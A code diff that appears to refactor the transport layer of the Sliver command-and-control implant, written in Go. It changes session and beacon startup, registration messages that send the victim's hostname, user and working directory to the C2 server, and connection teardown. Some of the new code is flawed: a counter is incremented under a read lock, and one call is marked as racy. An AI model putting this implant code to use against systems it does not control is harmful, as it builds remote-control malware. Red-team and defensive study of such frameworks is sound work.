@@ -32,6 +32,8 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"sync"
+	"time"
 
 	"github.com/gofrs/uuid"
 	"google.golang.org/protobuf/proto"
@@ -51,7 +53,8 @@ import (
 // C2 - A wrapper around a physical connection, embedding what is necessary to perform
 // connection multiplexing, and RPC layer management around these muxed logical streams.
 type C2 struct {
-	ID string // Short ID  for easy selection
+	ID    string        // Short ID  for easy selection
+	mutex *sync.RWMutex // Concurrency management
 
 	// The priority of use of this implant, simply increased at load time by C2s struct
 	Priority int
@@ -68,7 +71,7 @@ type C2 struct {
 
 	// Some protocol stacks might require us to pass custom cleanup functions around
 	// and with detached pieces, like virtual interfaces for WireGuard, etc..
-	cleanup func()
+	cleanup func() error
 
 	// conn - A physical connection initiated by/on behalf of this transport.
 	// From this conn will be derived one or more streams for different purposes.
@@ -102,18 +105,22 @@ type C2 struct {
 // according to the complete URI passed as parameter, and classic templating.
 func NewC2FromBytes(profileData string) (t *C2, err error) {
 
-	// Unmarshal from JSON
+	// Base transport settings
 	t = &C2{
-		Profile: &sliverpb.C2Profile{},
+		mutex:    &sync.RWMutex{},
+		failures: 0,
+		attempts: 0,
+		Profile:  &sliverpb.C2Profile{},
 	}
 
+	// Unmarshal from JSON
 	err = json.Unmarshal([]byte(profileData), t.Profile)
 	if err != nil {
 		return nil, errors.New("Failed to parse string profile")
 	}
 
 	p := t.Profile
-	t.ID = p.ID // The transport has, by default, the same ID as the transport
+	t.ID = p.ID // The transport has, by default, the same ID as the Profile
 	var fullPath = strings.ToLower(p.C2.String()) + "://" + p.Hostname
 	if p.Port > 0 {
 		fullPath = fullPath + ":" + strconv.Itoa(int(p.Port))
@@ -134,9 +141,12 @@ func NewC2FromBytes(profileData string) (t *C2, err error) {
 // NewC2FromProfile - Generate a kinda ready C2 channel driver, from a profile.
 func NewC2FromProfile(p *sliverpb.C2Profile) (t *C2, err error) {
 
+	// Base transport settings
 	t = &C2{
-		ID:      p.ID,
-		Profile: p,
+		ID:       p.ID,
+		failures: 0,
+		attempts: 0,
+		Profile:  p,
 	}
 
 	path := p.Hostname
@@ -163,24 +173,39 @@ func NewC2FromProfile(p *sliverpb.C2Profile) (t *C2, err error) {
 func (t *C2) Start() (err error) {
 
 	// The starting process happens in this order:
-	// 1 - A "physical" connection is established to the server (even short-lived/conceptual ones like HTTP)
+	// 1 - A physical connection is established to
+	// the server for protocols based on a net.Conn
 	err = t.startTransport()
 	if err != nil {
 		return
 	}
 
-	// 2 - A (logical) connection/beacon is being wrapped around the physical connection.
-	// This setp should ALWAYS return a working Connection/Beacon object, regardless of if
-	// an underlying transport primitive was created in step 1.
+	// In any case, we set up a logical connection:
+	// It can make use of either the physical connection if
+	// there is one, or create this logical connection directly
+	// out of the C2 implementation, like HTTP and DNS C2s
+	// This layer is used by BOTH sessions and beacons.
+	err = t.StartSession()
+	if err != nil {
+		return
+	}
+
+	// If the C2 profile is a Session, serve the appropriate handlers
 	if t.Profile.Type == sliverpb.C2Type_Session {
-		err = t.StartSession()
-		if err != nil {
-			return
-		}
+		// {{if .Config.Debug}}
+		log.Printf("Running in Session mode (Transport ID: %s)", t.ID)
+		// {{end}}
+
 		go t.ServeSessionHandlers()
 	}
+
+	// If the profile is a beacon, start serving its handlers in the background
 	if t.Profile.Type == sliverpb.C2Type_Beacon {
-		t.startBeacon()
+		// {{if .Config.Debug}}
+		log.Printf("Running in Beacon mode (Transport ID: %s)", t.ID)
+		// {{end}}
+
+		go t.ServeBeacon()
 	}
 
 	return nil
@@ -190,18 +215,14 @@ func (t *C2) Start() (err error) {
 // like a net.Conn type stream. This function might altogether bypass this step if the C2
 // Channel does not require such primitive.
 func (t *C2) startTransport() (err error) {
-
 	switch t.Profile.Direction {
+
 	case sliverpb.C2Direction_Bind:
 		return t.startBind()
+
 	case sliverpb.C2Direction_Reverse:
 		return t.startReverse()
 	}
-
-	return
-}
-
-func (t *C2) startBeacon() (err error) {
 	return
 }
 
@@ -210,12 +231,26 @@ func (t *C2) Register() (err error) {
 
 	// Register a session
 	if t.Profile.Type == sliverpb.C2Type_Session {
-		t.Connection.RequestSend(t.registerSliver())
+		// Prepare the registration
+		data, err := proto.Marshal(t.registerSliver())
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Failed to encode register msg %s", err)
+			// {{end}}
+			return nil
+		}
+		envelope := &sliverpb.Envelope{
+			Type: sliverpb.MsgRegister,
+			Data: data,
+		}
+		t.Connection.RequestSend(envelope)
 	}
 
-	// Or register a beacon
+	// Or register a beacon, wrapping the register into a special envelope.
 	if t.Profile.Type == sliverpb.C2Type_Beacon {
-		t.Beacon.Start()
+		t.Connection.RequestSend(t.registerBeacon())
+		t.Beacon.Close() // RISKY WITH RACE CONDITIONS
+		time.Sleep(time.Second)
 	}
 
 	// This C2 is now active
@@ -226,20 +261,8 @@ func (t *C2) Register() (err error) {
 
 // RegisterTransportSwitch - Notify the server that this transport is started after a switch
 func (t *C2) RegisterTransportSwitch(oldTransportID string) (err error) {
-
-	// Register a session
-	if t.Profile.Type == sliverpb.C2Type_Session {
-		t.Connection.RequestSend(t.registerSwitch(oldTransportID))
-	}
-
-	// Or register a beacon
-	if t.Profile.Type == sliverpb.C2Type_Beacon {
-		t.Beacon.Start()
-	}
-
-	// This C2 is now active
-	t.Profile.Active = true
-
+	t.Connection.RequestSend(t.registerSwitch(oldTransportID))
+	t.Profile.Active = true // This C2 is now active
 	return
 }
 
@@ -253,7 +276,12 @@ func (t *C2) Stop() (err error) {
 
 	// Close the RPC connection per se.
 	if t.Connection != nil {
-		t.Connection.Cleanup()
+		err = t.Connection.Close()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Error closing Session connection (%s  ->  %s", t.Conn.LocalAddr(), t.Conn.RemoteAddr())
+			// {{end}}
+		}
 	}
 
 	// Just check the physical connection is not nil and kill it if necessary.
@@ -261,7 +289,12 @@ func (t *C2) Stop() (err error) {
 		// {{if .Config.Debug}}
 		log.Printf("killing physical connection (%s  ->  %s", t.Conn.LocalAddr(), t.Conn.RemoteAddr())
 		// {{end}}
-		return t.Conn.Close()
+		err = t.Conn.Close()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Error closing connection (%s  ->  %s", t.Conn.LocalAddr(), t.Conn.RemoteAddr())
+			// {{end}}
+		}
 	}
 
 	// {{if .Config.Debug}}
@@ -271,7 +304,7 @@ func (t *C2) Stop() (err error) {
 }
 
 // registerSliver - Open a new (beacon or normal) session with the server
-func (t *C2) registerSliver() *sliverpb.Envelope {
+func (t *C2) registerSliver() *sliverpb.Register {
 	hostname, err := os.Hostname()
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -281,7 +314,6 @@ func (t *C2) registerSliver() *sliverpb.Envelope {
 	}
 	currentUser, err := user.Current()
 	if err != nil {
-
 		// {{if .Config.Debug}}
 		log.Printf("Failed to determine current user %s", err)
 		// {{end}}
@@ -327,7 +359,7 @@ func (t *C2) registerSliver() *sliverpb.Envelope {
 	log.Printf("Work dir: %s", workDir)
 	// {{end}}
 
-	data, err := proto.Marshal(&sliverpb.Register{
+	return &sliverpb.Register{
 		Name:             consts.SliverName,
 		Hostname:         hostname,
 		HostUUID:         hostUUID,
@@ -343,16 +375,6 @@ func (t *C2) registerSliver() *sliverpb.Envelope {
 		WorkingDirectory: workDir,
 		TransportID:      t.Profile.ID,
 		UUID:             sessUUID.String(),
-	})
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Failed to encode register msg %s", err)
-		// {{end}}
-		return nil
-	}
-	return &sliverpb.Envelope{
-		Type: sliverpb.MsgRegister,
-		Data: data,
 	}
 }
 
@@ -361,19 +383,10 @@ func (t *C2) registerSliver() *sliverpb.Envelope {
 // one, and we just update connection/transport relevant values.
 func (t *C2) registerSwitch(oldTransportID string) *sliverpb.Envelope {
 
-	p := t.Profile
-	path := p.Hostname
-	if p.Port > 0 {
-		path = path + ":" + strconv.Itoa(int(p.Port))
-	}
-	if p.Path != "" {
-		path = path + p.Path
-	}
-
 	data, err := proto.Marshal(&sliverpb.RegisterTransportSwitch{
 		OldTransportID: oldTransportID,
 		TransportID:    t.ID,
-		RemoteAddress:  path,
+		RemoteAddress:  t.uri.String(),
 		Response:       &commonpb.Response{},
 	})
 
@@ -387,4 +400,12 @@ func (t *C2) registerSwitch(oldTransportID string) *sliverpb.Envelope {
 		Type: sliverpb.MsgRegisterTransportSwitch,
 		Data: data,
 	}
+}
+
+// FailedAttempt - Notify an failed attempt to initiate
+// full Session/Beacon at some point in the stack.
+func (t *C2) FailedAttempt() {
+	t.mutex.RLock()
+	defer t.mutex.RUnlock()
+	t.attempts = t.attempts + 1
 }
